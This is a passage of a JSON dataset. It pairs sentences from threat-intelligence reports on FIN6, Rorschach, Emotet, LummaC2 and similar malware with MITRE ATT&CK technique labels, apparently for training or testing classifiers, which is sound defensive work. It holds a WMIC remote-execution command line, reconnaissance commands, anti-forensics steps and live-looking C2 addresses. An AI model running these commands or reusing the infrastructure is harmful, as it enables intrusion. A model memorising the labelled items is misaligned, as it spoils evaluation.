    "text": "The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as \"/ilX9zObq6LleAF8BBdsdHwRjapd8_1Tl4Y- 9Rc6hMbPXHPgVTWTtb0xfb7BpIyC1Lia31F5gCN_btvkad7aR2JF5ySRLZmTtY\" over TCP port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This C2 URL contained shellcode that would make an HTTPS request for an additional download.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 also moved laterally to servers in the environment using RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "configured them as malware \"distribution\" servers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The distribution servers were used to stage the LockerGoga ransomware, additional utilities, and deployment scripts to automate installation of the ransomware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant identified a utility script named kill.bat that was run on systems in the environment. This script contained a series of anti-forensics and other commands intended to disable antivirus and destabilize the operating system.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 automated the deployment of kill.bat and the LockerGoga ransomware using batch script files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Domain administrators have complete control over Windows systems in an Active Directory environment",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "C:\\windows\\dllhost.dat Credential theft module Written as a .tmp file to the temp directory Ransomware splash and warning files Command Line Execution ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The malware is a DLL that is launched using rundll32.exe: “C:\\Windows\\perfc.dat”,#1 18",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "It is executed with the following arguments: #1 → This is the ordinal number of the exported function 18 → Minutes used to determine how long to wait for the scheduled shutdown “username:pass” → Credentials to be used to propagate the malware on the network. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Process Hashes and Process Privilege Checks Upon being loaded, the malware starts a subroutine that hashes each running process on the system, and compares each hash with 3 hardcoded hashes: 0x6403527E → avp.exe associated with Kaspersky AV 0x23214B44 → ns.exe associated with Norton Security 0x651B3005 → ccSvcHst.exe associated with Symantec A global flag PROC_FLAG is used to track which of the 3 processes are running on the system. PROC_FLAG",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways: ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Server service, which both enforces security policies and acts as the security package manager for the LSA This file extracts credentials from LSASS similar to Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware creates a thread for core work that invokes the following API’s: GetExtendedTcpTable to retrieve a list of TCP endpoints GetIpNetTable to retrieve the IPv4 to physical address mapping table → Gets a MIB_IPNETTABLE structure NetServerEnum to get a list of servers on the domain with the following parameters: Servername = null level = 101 (return server names, types, and associated data) NetServerGetInfoto retrieve the current configuration for the local server, specifically to determine if the system is a non-domain controller server, a primary domain controller, or a backup domain controller.",
    "command": "",
    "labels": [
      "T1082",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "For each client, the following occurs: Obtains the IP address from the ClientIpAddress field in the DHCP_CLIENT_INFO structure Attempts to establish a socket connection to the client IPs over ports 445 and 139 (both associated with SMB) SMB Copy and Remote Execution There are two approaches to using valid credentials to copy and execute the malware to a remote host: Token impersonation Requires the process to have “SeTchPrivilege” Stolen credentials Each of these methods will be used to do a UNC write to Admin$ and then execute the malware on the target machine. ",
    "command": "",
    "labels": [
      "T1016",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "UNC Write to Admin$ WNetAddConnection2W is used to connect to a server using the default credentials for the impersonated token, and an attempt is made to write the file to: \\\\server-name\\\\admin$\\\\malware-name UNC write to admin$ CreateFile and WriteFile are used to write the file to the remote server.",
    "command": "",
    "labels": [
      "T1078",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "→ run as system -d → do not wait for process termination -u → username (not shown here) -p → password (not shown here) WMIC ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The following command will execute on the remote as the specified user: C:\\Windows\\system32\\wbem\\wmic.exe /node:”<server name>” /user:”<username>”",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "/password:”<password>” process call create “C:\\Windows\\System32\\rundll32.exe \\”C:\\Windows\\perfc.dat\\” #1 19 “<additional creds for arguments>”” /node → specify server name /user → username /password → password Process call create → execute remote command Once the command line arguments are generated, either CreateProcessAsUser or CreateProcess is executed, depending on whether this is being done through impersonation or stolen credentials. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In addition, another random array of bytes 0x8 in length is created using the same API call; this is used as the nonce for the encryption.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": ".vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The malware only targets fixed drives on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The malware will first start enumerating files in the directory it is being executed from.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The following steps are taken to encrypt the individual files: Gets file handle Gets the file size Creates a file mapping of the file with PAGE_READWRITE protection Maps the view of the file mapping with FILE_MAP_WRITE | FILE_MAP_READ access Calls CryptEncrypt to encrypt the contents of the file using AES-128 Once the files in a folder are encrypted, the ransomware drops a ransomware note in a file named README.txt.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The <HH:MM> value depends on the second parameter when being invoked by rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "If the second parameter is 30, the scheduled task will trigger 30 minutes after the malware execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "However, if no second parameter is provided, the scheduled task is set to trigger 60 minutes after the malware execution by default. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Explanation of schtask parameters: /TN → taskname (not providing a custom name forces Windows to provide a random GUID as a name) /TR → taskrun.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Path and filename of the task to be run /ST → starttime Explanation of shutdown.exe parameters: ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "/r → reboot after shutdown /f → forces running applications to close In addition, it also invokes the API NTRaiseHardError.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This is an undocumented Windows API that causes the system to reboot.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The malware also spawns cmd.exe to execute the following command: ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Shellcode which is used for code injection. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “co.ps1” and create scheduled tasks for persistence. Figure 4.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell script to create a ImmediateTask through GPO ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It supports proxy (Socks5), upload/download file and remote shell functions.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2 – A piece of malware code creates a specially crafted window to bypass the smadAV. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "First, the malware enumerates the system for the following data and concatenates it to one string: ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The current system username The current username home folder The system’s network interfaces (name, MacAddress, description) ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The main Rorschach payload config.ini is subsequently loaded into memory as well, decrypted and injected into notepad.exe, where the ransomware logic begins. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disable the Windows firewall, using netsh.exe Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its files into the scripts folder of the DC, and deletes them from the original location. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This is done by creating a schedule task invoking taskkill.exe. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "After Rorschach is injected into notepad.exe, it’s still protected by VMProtect.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It makes direct system calls using the “syscall” instruction.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In other words, the malware first creates a syscall table for NT APIs used for file encryption: Figure 3 – Creation of syscall table for certain NT APIs. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Command Line Arguments ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "--nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "However, the list of processes to be stopped differs slightly, as Rorschach omits notepad.exe, which is used as a target for code injection. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "5086014001000000 f0040becfb7f0000 \"edgehtml.dll\" Getting the PoC’s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "public: virtual void trigger(char* a1) { callback(a); } }; The ‘trigger’ method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Case Summary The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Almost all the instances of Emotet included three enumeration commands executed: systeminfo ipconfig /all ",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A service was also created for the agent. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Event 7045A service was installed in the system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "-m svcService Type: user mode serviceService Start Type: auto startService Account:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "LocalSystem Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Service Name: Mesh AgentService File Name: \"C:\\Program Files\\Mesh Agent\\MeshAgent.exe\"Service Type: user mode serviceService Start Type: auto startService Account:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "LocalSystem On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Service Name: AnyDesk ServiceService File Name: \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --serviceService",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Type: user mode serviceService Start Type: auto startService Account:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "LocalSystem Privilege Escalation We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system. ",
    "command": "",
    "labels": [
      "T1055",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\\Windows\\system32\\winlogon.exe Cobalt Strike C:\\Windows\\System32\\RuntimeBroker.exe Cobalt Strike C:\\Windows\\System32\\svchost.exe Cobalt Strike C:\\Windows\\System32\\taskhostw.exe Cobalt Strike C:\\Windows\\system32\\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These were then repeated, seen occurring once a day from the Emotet host. systeminfo ipconfig /all ",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "nltest /dclist: Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "whoami /groups net group /domain net group \"domain computers\" /domain ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "ping COMPUTER.REDACTED.local Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike: ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first find.bat was used to run AdFind.exe for Active Directory discovery. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Collection On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Both HTTP and HTTPS were observed to be used. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Network mapping was performed using SoftPerfect Network Scanner (netscan.exe) followed by Quantum ransomware execution and propagation in the network (locker.dll). ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe) Detections Network The DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167 ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The LummaC2 stealer begins its operations by obtaining relevant device data, such as OS version and architecture, hardware ID, CPU, RAM, screen resolution, system language, etc.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This malware can exfiltrate files and extract data from specific applications.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This stealer may acquire browsing histories, Internet cookies, usernames/passwords, personally identifiable details, credit card numbers, and other highly sensitive information from browsers.",
    "command": "",
    "labels": [
      "T1005",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Process Name Command Line tmp.exe C:\\Users\\admin\\AppData\\Local\\Temp\\tmp.exe Behavior Activities: tmp.exe Infostealers often target stored browser data, which can include saved credentials etc. ",
    "command": "",
    "labels": [
      "T1005",
      "T1078",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Registry Key Sets: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable 1 HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer %HTTP_PROXY%:8080 Reads browser cookies and saves this path: C:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ymgarh1v.defaul t\\cookies.sqlite Connects to the server without a hostname. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The stealer also targets crypto wallets such as Binance, Electrum, and Ethereum and collects sensitive information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Making a ‘POST’ request, tmp.exe is trying to pass information. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Content-Disposition: form-data; name=”hwid” {78494464-3fdf-11ed-8279-806e6f6e6963} Content-Disposition: form-data; name=”pid” 1 Content-Disposition: form-data; name=”lid” xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx When we examine the contents of the zip file viewed from the PCAP file, it collects information, primarily system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "We have obtained different zip files because Lumma Stealer sent multiple POST requests to the “c2/sock” address.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In conclusion, Lumma Stealer collects cookie information, search histories, and key inputs from browsers and transfers them to the C2 address.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The list of all the information it tries to collect inside of the “Web Data” SQLite file is given in the last image. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "We accessed C2 while visiting port 80. (VirusTotal Graph: Collection) ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Shodan Result Communication Addresses Requests 195[.]123[.]226[.]91 POST /c2sock: multipart/form-data;boundary=оaj195iak20ka99441aj1 144[.]76[.]173[.]247 GET/login LummaC2 behaves like other stealer-type malware, which can take away system and sensitive data from the victim’s machine.",
    "command": "",
    "labels": [
      "T1005",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Step 1 – Once the victim reaches the page via phishing email or SMS text, they are instructed to click “Confirm” to view a message from “Express.”",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The user is also asked to permit push notifications in the browser, which allows the attacker to push malicious ads, as we will demonstrate later in this analysis. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It uses some tricks to avoid detection, such as a new defence evasion technique, known as reflective DLL loading, to inject a DLL from memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After getting the configuration file, the malware will parse it and save the fields in memory and write in the registry information to encrypt the files in the machine.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The malware will try first to write in the registry-hive “HKEY_LOCAL_MACHINE” but if it cannot create it, it will use the registry-hive “HKEY_CURRENT_USER”: Figure 12.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Write in the registry After the writing in the registry has been completed, it will get some privileges using a token as SE_DEBUG_PRIVILEGE and SE_IMPERSONATE_PRIVILEGE: Figure 13.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Get some special privileges in the token Later, the malware creates three threads, one to get information about the machine, such as the operating system version, one to get processes and the last one to get services in the system. ",
    "command": "",
    "labels": [
